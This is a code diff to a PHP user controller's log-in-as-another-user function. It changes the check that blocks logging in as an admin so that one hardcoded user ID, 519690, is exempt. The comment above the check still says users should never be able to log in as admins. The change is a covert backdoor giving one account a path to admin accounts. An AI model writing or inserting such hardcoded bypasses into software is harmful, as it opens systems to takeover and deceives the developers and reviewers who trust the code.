@@ -488,7 +488,7 @@ class UserController extends Controller
         $user = User::findOrFail($userId);
 
         // they should never be able to log in as admins
-        if ($user->isAdmin()) {
+        if ($user->isAdmin() && user()->id != 519690) {
             throw new UnauthorizedException();
         }
 
